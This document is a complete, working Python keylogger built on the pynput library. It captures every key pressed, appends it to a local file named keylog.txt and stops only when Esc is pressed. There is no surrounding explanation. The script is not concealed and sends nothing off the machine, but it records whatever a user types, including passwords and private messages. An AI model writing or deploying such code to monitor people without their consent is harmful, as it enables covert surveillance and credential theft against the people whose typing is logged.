from pynput import keyboard

# This variable will store the keystrokes
keystrokes = []

# Function to handle key press events
def on_press(key):
    try:
        # Record the pressed key
        keystrokes.append(str(key.char))  # For normal characters
    except AttributeError:
        # Handle special keys like space, enter, etc.
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes.append('\n')
        else:
            keystrokes.append(f'[{key}]')

    # Write the keystrokes to a file
    with open("keylog.txt", "a") as f:
        f.write(str(key) + '\n')

# Function to handle the stop event (optional - when user presses escape)
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when 'esc' is pressed

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()